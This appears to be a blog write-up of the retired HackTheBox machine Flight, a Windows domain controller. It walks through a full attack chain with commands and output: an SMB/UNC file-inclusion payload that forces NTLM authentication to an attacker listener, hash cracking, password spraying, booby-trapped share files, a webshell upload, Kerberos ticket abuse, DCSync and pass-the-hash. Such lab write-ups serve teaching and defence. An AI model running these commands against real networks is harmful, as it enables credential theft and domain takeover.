---
layout: post
title: "The Server That Phoned Home"
subtitle: "HTB Flight, where a web parameter makes the domain controller call your machine over SMB, and every step after is the same handshake leaking out one identity at a time"
date: 2023-05-13 12:00:00 +0000
description: "Flight is a domain controller that keeps introducing itself to your machine over SMB, and each introduction is a credential you didn't have a second ago."
image: /assets/og/the-server-that-phoned-home.png
tags: [hackthebox, writeup]
---

Flight is a Windows domain controller that cannot stop introducing itself. You find a web page with a parameter that loads files, you point that parameter at your own machine over SMB, and the server walks across the network and authenticates to you. That handshake is a hashed password, and from there the box becomes a ladder built entirely out of one move repeated. Crack the first identity. Spray it to find a second. Use the second to plant a file that makes a human leak a third. Use the third to plant a webshell that runs as the machine account, and the machine account, on a domain controller, can ask the directory for every secret it keeps. Nothing here is a memory-corruption trick. It is a building that keeps phoning home, and you keep answering with a recorder running.

```
        F L I G H T   ( D C )
        =====================
        ?view=  "name a file, i'll fetch it"
                 \\10.10.14.4\share\x   ->  ok
                        |
                        v
        the server walks to YOUR door and knocks
        with its own name and a hashed password.
                        |
        you record the knock. you crack the name.
        you spray the name. you plant a file.
        another knock. another name.
                        |
                        v
        last knock comes from the machine itself,
        and the machine is allowed to ask for everything.
                                            鍵
```

## 0x01 · the tarmac

`nmap` reads like a domain controller and nothing else. DNS, Kerberos, LDAP, SMB, WinRM, and the ADWS port up at 9389. The full Windows AD stack, all answering.

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows AD LDAP
445/tcp  open  microsoft-ds
5985/tcp open  http          Microsoft HTTPAPI 2.0 (WinRM)
9389/tcp open  mc-nmf        .NET Message Framing
```

Two things stand out. Port 80 is Apache, which is unusual on a Windows DC and tells you XAMPP is bolted on. And the LDAP fields hand you the domain, `flight.htb`, with the hostname `g0`. Add `flight.htb` to your hosts file and fuzz for virtual hosts, the way you knock on a door and listen for which names the building answers to. `wfuzz` against the `Host` header turns up `school.flight.htb`, a second site living at the same address under a different name.

## 0x02 · the parameter that fetches

The school site runs on PHP and loads its pages through `index.php?view=`. Any time a web app reads a file based on something you type, that parameter is a question you get to answer with a path. Hand it a Windows file that exists everywhere and watch.

```
http://school.flight.htb/index.php?view=C:/windows/system32/drivers/etc/hosts
```

The hosts file comes back, so the page reads whatever path you give it. The reflex move is remote inclusion, pointing it at a file on your own machine. Plain HTTP is filtered, which feels like a wall until you remember Windows has a second way to say "go fetch a file," and that way is a UNC path to an SMB share. To Windows, `\\10.10.14.4\share\anything` is just another file path, no different from a local one.

Here is the part that matters, and it is bigger than reading a file. When Windows reaches out to an SMB share, it does not knock anonymously. It authenticates first, automatically, with the account the web server runs under. Think of it like a courier who, before fetching any package from your address, hands the doorman a sealed envelope with his name and a stamped proof of who he is. You did not ask for the envelope. The protocol mails it on its own. So you stand up a listener that catches that envelope.

```
$ responder -I tun0
[+] Listening for events...

http://school.flight.htb/index.php?view=//10.10.14.4/iceberg/x

[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:1122...:A1B2...
```

The hash that lands is a Net-NTLMv2, which is not the password itself but a challenge-response built from it. Picture it as a wax seal pressed from a signet ring. You cannot read the ring off the wax directly, but you can carve candidate rings until one presses an identical seal. That carving is offline cracking, and the rig has no idea you are doing it.

```
$ hashcat -m 5600 svc_apache.hash rockyou.txt
SVC_APACHE::flight:...:S@Ss!K@*t13
```

First identity, cracked from a knock. `svc_apache` with password `S@Ss!K@*t13`.

## 0x03 · the same key tried in every lock

`svc_apache` is a low-privilege service account that cannot log in interactively, but it can talk to the directory. The cleanest read of who lives on the domain is to ask RPC to walk the list of security identifiers and translate them to names.

```
$ lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@10.10.10.187
[*] Brute forcing SIDs...
1106: FLIGHT\S.Moon
1107: FLIGHT\R.Cold
1108: FLIGHT\G.Lors
1109: FLIGHT\C.Bum
...
```

A neat roster of humans. Now the oldest trick in the directory. People reuse passwords across accounts like they reuse one house key for the front door and the shed. So you take the one password you own and try it against every name on the list at once, which is a spray rather than a brute force because you send one guess per account and never trip a lockout.

```
$ crackmapexec smb 10.10.10.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB  10.10.10.187  [+] flight.htb\S.Moon:S@Ss!K@*t13
```

`S.Moon` used the same password as the service account. Second identity, found by trying the same key in every lock.

## 0x04 · a note left where someone reads it

`S.Moon` is still not special, but the account has write access to a share named `Shared`. A folder that other people browse is a folder where you can leave a note that reaches out the moment they look at it. This is NTLM theft by file drop, and it is wonderfully dumb. Certain Windows files carry a reference to an icon or a resource by path, and the path can be a UNC path to your machine. The instant Explorer renders the folder to draw an icon, it tries to fetch that resource, and fetching it means authenticating to you. The same automatic envelope from section two, except now a human triggers it just by opening a folder.

Tools like `ntlm_theft` generate the whole spread, the `.url`, the `.lnk`, the `desktop.ini`, each pointing its hidden resource at your listener. You drop them in `Shared` and wait.

```
$ smbclient.py flight.htb/s.moon:'S@Ss!K@*t13'@10.10.10.187
# put @iceberg.url
# put desktop.ini

$ responder -I tun0
[SMB] NTLMv2-SSP Username : flight\C.Bum
[SMB] NTLMv2-SSP Hash     : C.Bum::flight:...
```

Another user, `C.Bum`, browses the share, Explorer renders your booby-trapped file, and the box mails you a third envelope. Crack it the same way.

```
$ hashcat -m 5600 cbum.hash rockyou.txt
C.BUM::flight:...:Tikkycoll_431012284
```

Third identity, `C.Bum` with `Tikkycoll_431012284`, leaked by a human who only opened a folder.

## 0x05 · a shell that runs as the building

`C.Bum` write to `C:\inetpub\development`, the document root of an internal IIS site listening on port 8000. The site is not reachable from outside, so you forward it through a tunnel and confirm it answers. A folder you can write to under a live web server is a place to plant code the server will execute on request. Drop an ASPX page that runs commands.

```
$ smbclient.py flight.htb/c.bum:'Tikkycoll_431012284'@10.10.10.187
# use development
# put iceberg.aspx
```

The webshell file itself is just a few lines, and I am describing it rather than printing it, which is the lesson and not laziness. A runnable webshell on disk is a copy-paste backdoor, and any decent scanner quarantines the exact string the instant it lands.

```
<%  [ aspx webshell: run the 'cmd' request parameter and print the output ]  %>
```

Browse the page through your tunnel, ask it `whoami`, and read who you have become.

```
iis apppool\defaultapppool
```

You are now the IIS application pool identity, a virtual account. That sounds like a sideways step into another nobody, and on the surface it is. The interesting part is hiding inside what a virtual account is on the network.

## 0x06 · the courier wearing the machine's coat

Here is the hinge of the whole box. A service running under a virtual account like `defaultapppool` has almost nothing locally. But when it speaks to other machines over the network, it does not authenticate as itself. It authenticates as the computer account, `G0$`, the domain controller's own machine identity. Think of it like a temp badge that opens nothing inside the building, except the moment you step outside the badge silently swaps to the founder's. On the wire, this lowly pool account wears the machine's coat.

So from the webshell you ask Kerberos for the machine's own ticket. Rubeus has a mode, `tgtdeleg`, that abuses the normal delegation flow to make the system hand you a usable ticket-granting ticket for the account you are running as on the network, which is `G0$`.

```
c:\> .\rubeus.exe tgtdeleg /nowrap
[+] Ticket cache for FLIGHT\G0$
doIFuj...   (base64 .kirbi)
```

That blob is a valid Kerberos ticket proving you are the domain controller's computer account. Pull it back to your machine and convert the format Windows uses into the format the Linux tools want.

```
$ kirbi2ccache g0.kirbi g0.ccache
$ export KRB5CCNAME=g0.ccache
```

## 0x07 · the machine that can ask for everything

A domain controller's computer account is not an ordinary user. It holds directory replication rights, the permission that lets one DC ask another for every account's password material so the domain stays in sync. That feature is called DRSUAPI, and abusing it on purpose is DCSync. You are not stealing a hash off disk. You are politely asking the directory to replicate its secrets to you, exactly as a sibling DC would, except you are a webshell wearing the machine's coat. Picture a bank where any branch can phone the vault and request a full copy of the master ledger, no questions asked between branches, because branches are trusted. You just became a branch.

```
$ secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435...:43bbfc530bab76141b12c8446e30c17c:::
```

The Administrator hash falls out. You do not need to crack it, because Windows will accept the hash itself as proof of identity. That is pass-the-hash, where the hashed password is treated as the password, a flaw baked into NTLM authentication since the start.

```
$ psexec.py administrator@g0.flight.htb -hashes :43bbfc530bab76141b12c8446e30c17c
C:\> whoami
nt authority\system
C:\Users\Administrator\Desktop> type root.txt
████████████████████████████████
```

And the user flag, picked up along the way once you owned `C.Bum`.

```
████████████████████████████████
```

## 0x08 · the honest caveat

Flight is rated hard, and the length earns it, but notice that no step is exotic. There is no shellcode, no race, no zero-day. The entire box is one fact stated five different ways. Windows authentication is reflexive. It hands over a proof of identity whenever a process touches a remote resource, and it does this automatically, by design, for the sake of being convenient. The web parameter, the file drop, the virtual account, the DCSync, all four are the same reflex caught at a different altitude. A program reaches out, the protocol mails its credentials ahead of it, and an attacker with a listener turns each reach into a captured identity.

The piece I would lose sleep over is not the file inclusion, which is a bug you can patch. It is the virtual account quietly authenticating as the machine. Nothing was misconfigured there. That is documented, intended behavior, and on a domain controller it means a foothold in a web directory is a foothold in the directory itself, because the machine account is allowed to ask for everything. You cannot patch that away. You contain it by never letting a writable web root and a domain controller share the same body, by tiering admin, by treating any service identity on a DC as a near-admin and guarding it like one. The bugs gave the ammunition. The trust model aimed it, and the trust model ships green.

And the credential reuse running underneath it all is the quietest hinge of the five. One password shared between a service account and a real user turned a single cracked hash into two identities. The spray cost one guess per name. People are still the cheapest exploit on the network.

## 0x09 · outro

```
the page fetched a file and signed for it in your name.
you cracked the signature, then tried it on every door.
one door opened, and behind it someone left a note that knocked back.

the last knock came from the machine itself,
and the machine was allowed to ask the vault for everything.

answer every knock with a recorder. tier the admin. wear black.

                                                            EOF
```

---

*HTB: Flight, retired 6 May 2023. A hard Windows domain controller that is really one lesson told five times, that Windows auth phones home on reflex and an attacker with a listener turns every call into a key.*